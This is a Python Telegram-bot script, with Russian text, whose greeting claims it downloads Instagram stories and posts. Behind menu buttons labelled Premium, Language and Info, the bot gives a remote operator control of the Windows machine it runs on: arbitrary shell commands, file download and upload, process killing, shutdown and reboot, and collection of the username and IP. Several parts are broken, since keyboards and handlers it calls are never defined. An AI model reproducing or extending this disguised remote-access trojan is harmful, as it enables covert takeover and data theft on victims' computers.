import telebot
import os
import time
import webbrowser
import requests
import platform
from telebot import types


bot_token = 'ваш_токен'
bot = telebot.TeleBot(bot_token)
my_id = {}

user_dict = {}



menu_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
btn_follow = types.KeyboardButton('Подписки (coming  soon)')
btn_premium = types.KeyboardButton('Премиум')
btn_lang = types.KeyboardButton('Язык')
btn_info = types.KeyboardButton('Информация')
menu_keyboard.row(btn_follow, btn_premium)
menu_keyboard.row(btn_lang, btn_info)

info_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
btn_faq = types.KeyboardButton('FAQ')
btn_help = types.KeyboardButton('Инструкция')
btn_channel = types.KeyboardButton('Канал проекта')
btn_assistance = types.KeyboardButton('Помощь')
btn_back = types.KeyboardButton('⏪Назад⏪')
info_keyboard.row(btn_faq, btn_help)
info_keyboard.row(btn_channel, btn_assistance)
info_keyboard.row(btn_back)



bot.send_message('Приветствую!'
                 '\n'
                 '\nЯ помогаю скачивать истории и публикации из Instagram.'
                 '\nПросто отправь мне имя пользователя или ссылку на профиль.'
                 '\n'
                 '\nНапример: samoylovaoxana или https://www.instagram.com/samoylovaoxana', reply_markup=menu_keyboard)


@bot.message_handler(content_types=["text"])
def get_text_messages(message):
    if message.from_user.id == my_id:
        bot.send_chat_action(my_id, 'typing')
        if message.text == "Подписки (coming  soon)":
            bot.send_message(my_id, "Coming soon")

        elif message.text == "Премиум":
            bot.send_message(my_id, "🖱Управление мышкой", reply_markup=mouse_keyboard)
            bot.register_next_step_handler(message, mouse_process)

        elif message.text == "Язык":
            bot.send_message(my_id, "📂Файлы и процессы", reply_markup=files_keyboard)
            bot.register_next_step_handler(message, files_process)

        elif message.text == "Информация":
            bot.send_message(my_id, "❇️Дополнительно", reply_markup=additionals_keyboard)
            bot.register_next_step_handler(message, addons_process)

        elif message.text == "⏪Назад⏪":
            back(message)

        else:
            pass

    else:
        info_user(message)


def addons_process(message):
    if message.from_user.id == my_id:
        bot.send_chat_action(my_id, 'typing')
        if message.text == "🔗Перейти по ссылке":
            bot.send_message(my_id, "Укажите ссылку: ")
            bot.register_next_step_handler(message, web_process)

        elif message.text == "✅Выполнить команду":
            bot.send_message(my_id, "Укажите консольную команду: ")
            bot.register_next_step_handler(message, cmd_process)

        elif message.text == "⛔️Выключить компьютер":
            bot.send_message(my_id, "Выключение компьютера...")
            os.system('shutdown -s /t 0 /f')
            bot.register_next_step_handler(message, addons_process)

        elif message.text == "♻️Перезагрузить компьютер":
            bot.send_message(my_id, "Перезагрузка компьютера...")
            os.system('shutdown -r /t 0 /f')
            bot.register_next_step_handler(message, addons_process)

        elif message.text == "🖥О компьютере":
            req = requests.get('http://ip.42.pl/raw')
            ip = req.text
            uname = os.getlogin()
            windows = platform.platform()
            processor = platform.processor()
            # print(*[line.decode('cp866', 'ignore') for line in Popen('tasklist', stdout=PIPE).stdout.readlines()])
            bot.send_message(my_id, f"*Пользователь:* {uname}\n*IP:* {ip}\n*ОС:* {windows}\n*Процессор:* {processor}",
                             parse_mode="markdown")

            bot.register_next_step_handler(message, addons_process)

        elif message.text == "⏪Назад⏪":
            back(message)

        else:
            pass

    else:
        info_user(message)


def back(message):
    bot.register_next_step_handler(message, get_text_messages)
    bot.send_message(my_id, "Вы в главном меню", reply_markup=menu_keyboard)


def info_user(message):
    bot.send_chat_action(my_id, 'typing')
    alert = f"Кто-то пытался задать команду: \"{message.text}\"\n\n"
    alert += f"user id: {str(message.from_user.id)}\n"
    alert += f"first name: {str(message.from_user.first_name)}\n"
    alert += f"last name: {str(message.from_user.last_name)}\n"
    alert += f"username: @{str(message.from_user.username)}"
    bot.send_message(my_id, alert, reply_markup=menu_keyboard)


def kill_process(message):
    bot.send_chat_action(my_id, 'typing')
    try:
        os.system("taskkill /IM " + message.text + " -F")
        bot.send_message(my_id, f"Процесс \"{message.text}\" убит", reply_markup=files_keyboard)
        bot.register_next_step_handler(message, files_process)
    except:
        bot.send_message(my_id, "Ошибка! Процесс не найден", reply_markup=files_keyboard)
        bot.register_next_step_handler(message, files_process)


def start_process(message):
    bot.send_chat_action(my_id, 'typing')
    try:
        os.startfile(r'' + message.text)
        bot.send_message(my_id, f"Файл по пути \"{message.text}\" запустился", reply_markup=files_keyboard)
        bot.register_next_step_handler(message, files_process)
    except:
        bot.send_message(my_id, "Ошибка! Указан неверный файл", reply_markup=files_keyboard)
        bot.register_next_step_handler(message, files_process)


def web_process(message):
    bot.send_chat_action(my_id, 'typing')
    try:
        webbrowser.open(message.text, new=0)
        bot.send_message(my_id, f"Переход по ссылке \"{message.text}\" осуществлён", reply_markup=additionals_keyboard)
        bot.register_next_step_handler(message, addons_process)
    except:
        bot.send_message(my_id, "Ошибка! ссылка введена неверно")
        bot.register_next_step_handler(message, addons_process)


def cmd_process(message):
    bot.send_chat_action(my_id, 'typing')
    try:
        os.system(message.text)
        bot.send_message(my_id, f"Команда \"{message.text}\" выполнена", reply_markup=additionals_keyboard)
        bot.register_next_step_handler(message, addons_process)
    except:
        bot.send_message(my_id, "Ошибка! Неизвестная команда")
        bot.register_next_step_handler(message, addons_process)


def say_process(message):
    bot.send_chat_action(my_id, 'typing')
    bot.send_message(my_id, "В разработке...", reply_markup=menu_keyboard)


def downfile_process(message):
    bot.send_chat_action(my_id, 'typing')
    try:
        file_path = message.text
        if os.path.exists(file_path):
            bot.send_message(my_id, "Файл загружается, подождите...")
            bot.send_chat_action(my_id, 'upload_document')
            file_doc = open(file_path, 'rb')
            bot.send_document(my_id, file_doc)
            bot.register_next_step_handler(message, files_process)
        else:
            bot.send_message(my_id, "Файл не найден или указан неверный путь (ПР.: C:\\Documents\\File.doc)")
            bot.register_next_step_handler(message, files_process)
    except:
        bot.send_message(my_id, "Ошибка! Файл не найден или указан неверный путь (ПР.: C:\\Documents\\File.doc)")
        bot.register_next_step_handler(message, files_process)


def uploadfile_process(message):
    bot.send_chat_action(my_id, 'typing')
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        src = message.document.file_name
        with open(src, 'wb') as new_file:
            new_file.write(downloaded_file)
        bot.send_message(my_id, "Файл успешно загружен")
        bot.register_next_step_handler(message, files_process)
    except:
        bot.send_message(my_id, "Ошибка! Отправьте файл как документ")
        bot.register_next_step_handler(message, files_process)


def is_digit(string):
    if string.isdigit():
        return True
    else:
        try:
            float(string)
            return True
        except ValueError:
            return False


while True:
    try:
        bot.polling(none_stop=True, interval=0, timeout=20)
    except Exception as E:
        print(E.args)
        time.sleep(2)